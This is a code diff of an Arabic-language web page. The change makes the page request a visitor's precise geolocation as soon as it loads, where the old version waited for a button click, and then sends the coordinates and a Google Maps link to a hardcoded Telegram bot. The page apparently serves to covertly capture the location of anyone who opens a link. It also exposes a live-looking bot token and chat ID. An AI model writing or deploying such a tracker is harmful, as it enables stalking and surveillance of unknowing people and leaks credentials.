@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>طلب إذن الموقع الجغرافي</title>
+    <title>إرسال الموقع الجغرافي</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -19,44 +19,47 @@
             max-width: 500px;
             margin: 0 auto;
         }
-        button {
-            background-color: #0088cc;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            margin-top: 20px;
-        }
-        button:hover {
-            background-color: #006699;
-        }
         #status {
             margin-top: 20px;
             font-weight: bold;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #0088cc;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>طلب إذن الوصول إلى الموقع الجغرافي</h1>
-        <p>هذا التطبيق يحتاج إلى إذنك للوصول إلى موقعك الجغرافي لتقديم خدمة أفضل.</p>
-        <button id="requestBtn">السماح بالوصول إلى الموقع</button>
+        <h1>جاري الحصول على موقعك الجغرافي</h1>
+        <p>يتم الآن طلب إذن الوصول إلى موقعك الجغرافي...</p>
+        <div class="loader"></div>
         <div id="status"></div>
     </div>
 
     <script>
-        document.getElementById('requestBtn').addEventListener('click', function() {
+        document.addEventListener('DOMContentLoaded', function() {
             const statusElement = document.getElementById('status');
-            statusElement.textContent = 'جاري طلب الإذن...';
+            statusElement.textContent = 'جاري تحديد الموقع...';
             
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
+                // استخدام watchPosition بدلاً من getCurrentPosition للحصول على أسرع استجابة
+                const watchId = navigator.geolocation.watchPosition(
                     function(position) {
                         const latitude = position.coords.latitude;
                         const longitude = position.coords.longitude;
-                        statusElement.textContent = 'تم الحصول على الموقع بنجاح!';
+                        
+                        // إيقاف مراقبة الموقع بعد الحصول عليه
+                        navigator.geolocation.clearWatch(watchId);
                         
                         // إرسال الموقع إلى بوت تلجرام
                         sendToTelegramBot(latitude, longitude);
@@ -78,26 +81,38 @@
                                 break;
                         }
                         statusElement.textContent = errorMessage;
+                        document.querySelector('.loader').style.display = 'none';
+                    },
+                    {
+                        enableHighAccuracy: true, // للحصول على دقة أعلى وأسرع
+                        maximumAge: 0, // عدم استخدام البيانات المخزنة مؤقتًا
+                        timeout: 5000 // وقت انتظار قصير
                     }
                 );
             } else {
                 statusElement.textContent = "المتصفح لا يدعم خدمة الموقع الجغرافي.";
+                document.querySelector('.loader').style.display = 'none';
             }
         });
 
         function sendToTelegramBot(latitude, longitude) {
             const statusElement = document.getElementById('status');
+            statusElement.textContent = 'جاري إرسال الموقع...';
             
-            // استبدل هذه القيم بمعلومات بوتك
+                     // استبدل هذه القيم بمعلومات بوتك
             const botToken = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
             const chatId = '7327464581';
             
-            const message = `تم استلام موقع جديد:
+            const message = `📍 تم استلام موقع جديد:
 الخط العرضي: ${latitude}
 الخط الطولي: ${longitude}
 رابط خرائط جوجل: https://www.google.com/maps?q=${latitude},${longitude}`;
             
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            // استخدام fetch مع AbortController للتحكم في الوقت المستغرق
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 3000); // مهلة 3 ثواني
             
             fetch(url, {
                 method: 'POST',
@@ -107,18 +122,27 @@
                 body: JSON.stringify({
                     chat_id: chatId,
                     text: message
-                })
+                }),
+                signal: controller.signal
             })
             .then(response => response.json())
             .then(data => {
+                clearTimeout(timeoutId);
+                document.querySelector('.loader').style.display = 'none';
                 if (data.ok) {
-                    statusElement.textContent += ' تم إرسال الموقع إلى بوت تلجرام بنجاح!';
+                    statusElement.textContent = 'تم إرسال الموقع بنجاح! يمكنك إغلاق هذه الصفحة.';
                 } else {
-                    statusElement.textContent += ' فشل في إرسال الموقع إلى بوت تلجرام.';
+                    statusElement.textContent = 'فشل في إرسال الموقع إلى بوت تلجرام.';
                 }
             })
             .catch(error => {
-                statusElement.textContent += ' خطأ في الاتصال بالإنترنت.';
+                clearTimeout(timeoutId);
+                document.querySelector('.loader').style.display = 'none';
+                if (error.name === 'AbortError') {
+                    statusElement.textContent = 'انتهى الوقت المخصص لإرسال الموقع.';
+                } else {
+                    statusElement.textContent = 'خطأ في الاتصال بالإنترنت.';
+                }
                 console.error('Error:', error);
             });
         }
